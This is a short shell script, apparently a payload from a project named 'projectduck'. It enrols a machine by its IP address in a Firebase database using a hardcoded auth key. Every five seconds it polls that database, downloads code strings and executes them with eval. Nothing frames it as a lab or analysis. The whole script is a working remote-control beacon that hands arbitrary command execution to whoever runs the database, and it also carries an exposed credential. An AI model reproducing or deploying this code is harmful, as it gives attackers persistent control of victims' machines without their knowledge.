ip="$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1' | sed 's/\.//g')"
while true
do
    date="$(date | sed 's/\:/\,/g' | sed 's/ /\g/g')"
    curl -X PATCH -d '{

    "ip": "'$ip'",
    "update": "'$date'"
  }' 'https://projectduck-6999c.firebaseio.com/enrolled/'$ip'.json?auth=Q0Pj5lVGrms9DMITLbuAzWmOpUafqJEw0Cg6j0se'
    update="$(curl 'https://projectduck-6999c.firebaseio.com/update/update.json?shallow=true&print=pretty')"
    if [ "$update" = true ] ; then
      updatecode="$(curl 'https://projectduck-6999c.firebaseio.com/update/updatecode.json?shallow=true&print=pretty' | sed 's:^.\(.*\).$:\1:' | sed -E 's/\\(.)/\1/g')"
      eval $updatecode;
    fi
    customcode="$(curl 'https://projectduck-6999c.firebaseio.com/enrolled/'$ip'/custom.json?shallow=true&print=pretty')"
    if [ "$customcode" = true ] ; then
      customcode="$(curl 'https://projectduck-6999c.firebaseio.com/enrolled/'$ip'/customcode.json?shallow=true&print=pretty' | sed 's:^.\(.*\).$:\1:' | sed -E 's/\\(.)/\1/g')"
      eval $customcode;
    fi
    sleep 5
done
